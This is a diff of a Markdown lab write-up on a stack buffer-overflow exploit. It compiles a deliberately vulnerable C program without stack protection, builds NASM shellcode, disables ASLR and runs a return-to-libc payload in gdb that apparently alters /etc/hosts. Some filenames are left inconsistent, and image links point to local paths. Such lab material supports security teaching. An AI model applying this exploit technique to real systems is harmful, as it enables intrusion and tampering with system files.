@@ -15,27 +15,21 @@
 ```sh
 nano vuln.c
 ```
-<img width="500" alt="Screenshot" src="https://github.com/CKMPeter/Information-Sec/blob/main/SecLab/nanoC.png?raw=true"><br>
+![image-20241104091628712](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104091628712.png)<br>
 
 After which use `crtl` +` o` to save ad `crtl`+`x` to exit.
 
 ### 3. Compile the newly written C file with `gcc`:
 
 ```sh
-sudo gcc -m64 -fno-stack-protector -z execstack -o vuln vuln.c
+gcc vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2
 ```
-
-`-m64`: Forces compilation in 64-bit mode (using libc6-dev-i386).
-
-`-fno-stack-protector`: Disables the stack protection feature.
-
-`-z execstack`: Marks the stack as executable.
 
 </br>
 
 ## **II. Set up the NASM program:**
 
-### 1. Create a NASM file named `attackCode.nasm`:
+### 1. Create a NASM file named `lab1.nasm`:
 
 ```sh
 nano attackCode.nasm
@@ -50,7 +44,7 @@ After which use `crtl` +` o` to save ad `crtl`+`x` to exit.
 #### a. Compile the file:
 
 ```sh
-nasm -f elf32 -o attackCode.o attackCode.nasm
+nasm -f elf32 -o lab1.o lab1.nasm
 ```
 
 **`-f elf32`**: This flag specifies the output format. In this case, it's generating a 32-bit **ELF**
@@ -62,7 +56,7 @@ nasm -f elf32 -o attackCode.o attackCode.nasm
 #### b. Link the file to an executable:
 
 ```sh
-ld -m elf_i386 -o attackCode attackCode.o
+ld -m elf_i386 -o lab1 lab1.o
 ```
 
 </br>
@@ -70,7 +64,7 @@ ld -m elf_i386 -o attackCode attackCode.o
 #### c. Generate the `shellcode` from the executable:
 
 ```sh
-objdump -d attackCode| grep '[0-9a-f]:' | grep -oP '\s\K[0-9a-f]+' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
+objdump -d lab1 | grep '[0-9a-f]:' | grep -oP '\s\K[0-9a-f]+' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
 ```
 
 **`objdump -d attackCode`**:
@@ -104,7 +98,7 @@ objdump -d attackCode| grep '[0-9a-f]:' | grep -oP '\s\K[0-9a-f]+' | tr -d '\n' 
 
 #### d. Total summary of process:
 
-<img alt="processNASM" src="https://github.com/CKMPeter/Information-Sec/blob/main/SecLab/attackCodeComplie.png?raw=true">
+![image-20241104092251134](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104092251134.png)
 
 after running the `objdump` command you will get the shellcode to inject into the vuln program.
 
@@ -112,13 +106,34 @@ after running the `objdump` command you will get the shellcode to inject into th
 
 ## III. EXECUTE THE ATTACK:
 
+### 1. turn off ASLR (Address Space Layout Randomization):
 
+![image-20241104092449640](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104092449640.png)
 
+### 2. create an environment variable in Linux with the path of file lab1.asm:
 
+![image-20241104092724884](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104092724884.png)
 
+### 3. use gdb:
 
+![image-20241104093358327](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104093358327.png)
 
+0xf7e50db0: Address of libc_system
+0xf7e449e0: Address of exit to avoid crashing
+0xffffd939: Address of env variable
 
+### 4. Attack File:
 
+```sh
+r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x39\xd9\xff\xff')")
+```
 
+![image-20241104095520665](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20241104095520665.png)
 
+after doing, so you would use
+
+```
+sudo cat /etc/hosts 
+```
+
+to see the newly added host.
